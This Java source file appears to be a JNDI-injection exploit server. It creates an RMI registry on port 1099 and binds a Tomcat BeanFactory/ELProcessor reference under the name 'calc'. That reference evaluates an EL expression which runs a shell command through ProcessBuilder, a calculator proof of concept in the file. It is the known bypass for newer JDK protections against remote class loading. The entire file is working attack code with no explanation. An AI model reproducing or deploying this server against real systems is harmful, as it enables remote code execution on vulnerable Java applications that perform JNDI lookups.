package jndi.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;

//@dependecy{tomcat}
public class rmi_server_high {
    public static void main(String args[]) throws Exception {

        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app']).start()\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("calc", referenceWrapper);
    }
}
